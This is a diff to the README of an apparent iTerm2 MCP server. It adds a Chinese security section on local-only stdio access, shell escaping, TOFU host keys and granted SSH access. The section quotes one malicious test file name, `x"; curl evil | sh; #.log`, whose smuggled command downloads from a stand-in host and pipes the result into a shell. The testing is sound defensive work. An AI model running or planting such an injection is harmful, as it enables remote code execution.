@@ -124,6 +124,13 @@ pip install iterm2 "mcp[cli]>=1,<2"   # homebrew Python 需加 --user --break-sy
 3. **name 寻址以 MCP 维护的注册表为准**（`~/.config/iterm2-mcp/registry.json`）——实测发现 shell integration 会在每条命令后用 OSC 转义序列把 session 标题重置回自动名（`~ (-zsh)`），`session.name` 不可靠，所以 `set_name` 仅尽力让 tab 标题可见，寻址不受影响；注册表未命中时兜底做实时 `session.name` 前缀匹配
 4. **只 send，不 exec**：工具集里不存在绕过终端屏幕的执行通道
 
+## 安全说明
+
+- **仅本地**：服务走 stdio，不监听任何端口，只有你注册的 AI 客户端能连。在终端执行任意命令是产品本身的能力而非副作用——命令出现时请照常过目。
+- **shell 转义**：传输工具拼进 `scp` / `ssh` 的所有路径与账号信息都在本地和远端两层命令行做了单引号转义（用 `x"; curl evil | sh; #.log` 这类恶意文件名实测验证）。
+- **host key 盲信（TOFU）**：`distribute_key` 用 `ssh-keyscan` 抓取 host key 直接写入 `known_hosts`，不做带外校验——这是 `ssh-keyscan` 自身的 trust-on-first-use 取舍。若首次连接存在中间人风险，请自行核对指纹后再用传输工具。
+- **`distribute_key` 会授予长期访问**：它把你的公钥追加进服务器 `authorized_keys`；要撤销就去掉该服务器上对应那行。
+
 ## 验证
 
 端到端集成测试（会在 iTerm2 真实开 tab / 发命令 / Ctrl+C / 关 tab）：
